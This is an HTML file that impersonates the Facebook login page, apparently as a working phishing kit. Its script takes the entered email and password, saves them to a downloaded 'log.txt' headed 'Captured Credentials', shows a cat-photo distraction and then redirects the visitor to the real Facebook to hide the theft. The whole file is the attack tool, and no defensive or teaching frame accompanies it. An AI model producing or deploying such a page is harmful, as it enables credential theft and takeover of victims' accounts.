<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Facebook - Log In</title>
<style>
  body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;
      display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
  .container{background:#fff;padding:30px;border-radius:8px;
      box-shadow:0 4px 12px rgba(0,0,0,.1);width:350px;text-align:center;}
  input{width:93%;padding:14px;margin-bottom:10px;border:1px solid #dddfe2;
        border-radius:6px;font-size:17px;box-sizing:border-box;}
  button{width:95%;padding:14px;background:#1877f2;color:#fff;
        border:none;border-radius:6px;font-size:20px;font-weight:bold;
        cursor:pointer;transition:background .3s;}
  button:hover{background:#166fe5;}
  h2{margin-bottom:15px;color:#1877f2;}
  #funny-photo-container{display:none;}
  .funny-img{width:100%;border-radius:8px;margin-bottom:15px;}
  .caption{font-size:14px;color:#65676b;margin-top:10px;}
</style>
</head>
<body>
<div class="container">
  <div id="login-form-container">
    <h2>Facebook</h2>
    <form id="phishing-form">
      <input type="text" name="email" placeholder="Email or Phone Number" required autocomplete="off">
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>

  <div id="funny-photo-container">
    <img src="https://placekitten.com/350/250" alt="Funny Cat" class="funny-img">
    <h3 style="margin:10px 0;color:#333;">Just saw this!</h3>
    <p class="caption">Wait for it… 🤣</p>
    <button onclick="window.location.href='https://www.facebook.com'"
            style="background:#e4e6eb;color:#050505;font-size:16px;margin-top:10px;">
      Go to Feed
    </button>
  </div>
</div>

<script>
  document.getElementById('phishing-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = this.email.value;
    const password = this.password.value;

    // 1. Create the text content for the file
    const content = `Captured Credentials:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;

    // 2. Generate a downloadable .txt file (Blob)
    const blob = new Blob([content], { type: 'text/plain' });
    const tempLink = document.createElement('a');
    tempLink.href = URL.createObjectURL(blob);
    tempLink.download = "log.txt"; // This is the file name that will download
    
    // 3. Trigger the download automatically
    document.body.appendChild(tempLink);
    tempLink.click();
    document.body.removeChild(tempLink);

    // 4. UI Switch (Show the cat photo)
    document.getElementById('login-form-container').style.display = 'none';
    document.getElementById('funny-photo-container').style.display = 'block';

    // 5. Redirect after 3 seconds
    setTimeout(() => {
      window.location.href = 'https://www.facebook.com';
    }, 3000);
  });
</script>
</body>
</html>
